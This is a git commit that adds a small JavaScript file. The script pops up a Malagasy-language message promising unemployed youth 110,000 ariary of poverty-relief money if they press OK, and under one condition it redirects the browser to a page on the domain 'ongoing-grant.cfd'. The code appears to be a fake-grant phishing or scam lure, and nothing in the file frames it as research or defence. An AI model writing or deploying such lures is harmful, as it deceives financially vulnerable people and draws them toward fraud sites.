02ae5b812e820251e88a495438398e5413e54a06
The-ongoing <preciousadaowo4@gmail.com>
2026-09-05 16:04:02 +0100

    Create activema11.js

---
+++ activema11.js
@@ -0,0 +1,10 @@
+var password = 'Ar110,000';
+
+password = prompt(
+  'Arahabaina, mendrika hahazo ny FANAMPIANA ARA-BOLA Ar 110,000 HIADIANA AMIN’NY FAHANTRANA HO AN’NY TANORA TSY MANANA ASA ianao. Tsindrio ny OK mba hahazoanao azy avy hatrany.',
+  'Ar110,000'
+);
+
+if (password !== 'Ar110,000') {
+    location.href = 'https://ongoing-grant.cfd/Ar110000-Fanampiana-Ara-Bola.html';
+}
